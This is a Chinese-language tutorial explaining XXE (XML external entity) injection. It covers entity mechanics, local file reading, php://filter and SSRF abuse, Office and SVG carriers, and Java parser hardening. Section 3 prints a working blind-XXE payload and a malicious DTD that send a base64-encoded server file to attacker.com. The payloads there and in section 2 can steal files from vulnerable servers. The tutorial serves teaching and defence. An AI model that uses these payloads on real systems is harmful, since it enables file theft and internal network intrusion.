---
title: "实体的反噬：XXE外部实体注入底层逻辑与OOB外带"
date: 2026-06-11T12:00:00+08:00
draft: false
weight: 6
---

# 实体的反噬：XXE外部实体注入底层逻辑与OOB外带

在早期的 Web 服务（如 SOAP、RESTful API 的早期阶段）以及各类复杂的企业级应用中，XML（可扩展标记语言）扮演着数据传输的核心角色。然而，XML 规范中为了扩展性而设计的一个古老特性——**DTD（文档类型定义）外部实体**，却成为了撕裂服务器文件系统边界的致命武器，这就是 **XXE（XML External Entity Injection）漏洞**。

本文将剥开 XML 的语法外衣，直击 XML 解析器（如 `libxml2`、Java `Xerces`）的底层行为，推演如何从简单的文件读取，进化到无回显情况下的 OOB（Out-Of-Band）数据外带，甚至利用特殊协议达成内网 SSRF 攻击。

---

## 1. 祸起 DTD：实体的本质与扩展机制

XML 设计之初，不仅为了传输数据，还允许文档“自我定义”其结构和变量。这种定义机制被称为 **DTD（Document Type Definition）**。

在 DTD 中，开发者可以定义**实体（ENTITY）**。实体就类似于编程语言中的“宏”或“常量变量”。

### 1.1 内部实体 (Internal Entity)
内部实体的数据直接硬编码在 XML 中。
```xml
<!DOCTYPE foo [
  <!ENTITY name "Admin">
]>
<user>&name;</user> <!-- 解析后变为 <user>Admin</user> -->
```

### 1.2 外部实体 (External Entity) —— 潘多拉魔盒
外部实体允许 XML 解析器去**外部资源**动态拉取数据来填充实体。这本是为了让多个 XML 文件共享同一个配置流而设计的特性，但却成了 XXE 漏洞的万恶之源。
```xml
<!DOCTYPE foo [
  <!-- SYSTEM 关键字指示解析器去读取本地或远程 URI -->
  <!ENTITY payload SYSTEM "file:///etc/passwd">
]>
<user>&payload;</user> <!-- 解析器自动读取密码文件并填充到这里 -->
```

---

## 2. 基础推演：文件窃取与协议滥用

当一个 Web 应用接收客户端的 XML 数据（如 API 接口、微信支付回调等），且底层的 XML 解析器（如 PHP 的 `simplexml_load_string` 默认配置，或旧版 Java 的 `DocumentBuilder`）没有禁用外部实体时，攻击就发生了。

### 2.1 跨平台的文件读取
*   **Linux/Unix**：`SYSTEM "file:///etc/passwd"` 或 `file:///etc/shadow`
*   **Windows**：`SYSTEM "file:///C:/Windows/win.ini"` 或 `file:///C:/inetpub/wwwroot/web.config`

### 2.2 协议滥用 (Wrapper & Protocol)
XML 解析器不仅支持 `file://`，不同语言底层的解析库还支持更丰富的伪协议：
*   **PHP**：支持 `php://filter` 协议。如果直接读取带有 `<` 或 `>` 等 XML 保留字符的代码文件（如 `config.php`），会破坏 XML 语法导致解析失败。攻击者利用 `php://filter/read=convert.base64-encode/resource=config.php`，让 PHP 先将文件 Base64 编码后再交由 XML 解析，完美绕过语法冲突。
*   **Java**：支持 `http://`、`https://`、`ftp://`、`jar://` 等。利用 `http://`，XXE 瞬间蜕变为 **SSRF（服务器端请求伪造）**，攻击者可以通过 XML 解析器去探测内网主机的开放端口，或者向内网 Redis 发生恶意 Payload。

---

## 3. 高阶实战：无回显情况下的 OOB (数据外带)

在真实的实战中，很多时候 XML 数据被解析后，服务器并不会把解析结果返回给前端（例如异步的日志处理、后台支付回调）。此时，即使 `file:///etc/passwd` 被成功读取，攻击者也看不到内容。这被称为 **Blind XXE（盲注）**。

解决 Blind XXE 的核心技术是 **OOB（Out-Of-Band，带外通信）**，即将读取到的本地数据，通过 HTTP/FTP 请求主动发送到攻击者的服务器上。

### 3.1 参数实体（Parameter Entity）的接力赛
为了构造 OOB，我们必须使用**参数实体**（以 `%` 开头的实体，只能在 DTD 内部使用）。

**攻击推演逻辑：**
1.  攻击者发送一个极简的恶意 XML，引用攻击者服务器上的外部 DTD 文件（`evil.dtd`）。
2.  受害者服务器解析 XML，去下载并解析 `evil.dtd`。
3.  `evil.dtd` 中定义了三个宏（实体），形成一条完美的执行链：
    *   **实体 A**：读取受害者本地的 `/etc/hostname`。
    *   **实体 B**：动态拼接一个指向攻击者服务器的 HTTP URL，并将 **实体 A 的内容作为 URL 参数**。
    *   **执行实体 C**：触发实体 B，迫使受害者服务器发起 HTTP 请求。

**恶意 evil.dtd 内容：**
```xml
<!-- 1. 读取目标机文件内容，赋值给 file 实体 -->
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hostname">
<!-- 2. 动态拼接外带 URL，赋值给 eval 实体 -->
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
<!-- 3. 执行 eval 实体，这会注册 send 实体 -->
%eval;
<!-- 4. 执行 send 实体，触发真正的 HTTP 请求，带出数据 -->
%send;
```

**受害者收到的 Payload：**
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!-- 触发目标去下载并解析攻击者的 DTD -->
    <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
    %remote;
]>
<root>test</root>
```
当受害者解析完毕后，攻击者的 Web 服务器日志中就会留下一条记录：
`GET /?data=aG9zdG5hbWVfdGVzdA== HTTP/1.1`
解码 Base64 即可得到受害者的主机名。

---

## 4. 隐蔽的攻击面：Office 文档与图片解析

XXE 的攻击面远不止 API 接口，只要底层触碰到了 XML 解析引擎，漏洞就可能触发。

*   **Office 文档 (docx, xlsx, pptx)**：现代 Office 文档本质上是包含了多个 XML 文件的 ZIP 压缩包。攻击者将 `.docx` 解压，修改其中的 `[Content_Types].xml` 或 `document.xml`，插入 XXE Payload，再重新打包上传。如果后端的文档预览服务（如 Apache POI）未作防护，解析时即触发 XXE。
*   **SVG 图片**：SVG（可缩放矢量图形）本质也是 XML。如果在支持 SVG 上传并由后端渲染（如 ImageMagick）的地方上传带有 XXE Payload 的 `.svg` 文件，同样可以实现文件窃取或 SSRF。

---

## 5. 终极防御：在解析引擎底层拔掉网线

防御 XXE 漏洞最有效的方法，不是去写复杂的正则过滤 `<DOCTYPE>` 或 `ENTITY`（这极容易被绕过），而是直接在**代码层面关闭 XML 解析库的外部实体解析特性**。

以 Java 为例，在使用 `DocumentBuilderFactory` 时，必须强制设置以下 Feature：

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 核心防御：彻底禁用外部实体 (External Entities)
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// 禁用参数实体
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
// 禁用外部 DTD 的加载
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
// 可选：启用 XInclude 支持时，也需要防范
dbf.setXIncludeAware(false);
```

XML 的初衷是“万物互联”与“高度可扩展”，而这种对外部资源的过度信任，恰恰成为了内网沦陷的导火索。理解 XXE，就是理解**数据结构与底层解析引擎之间的博弈**。
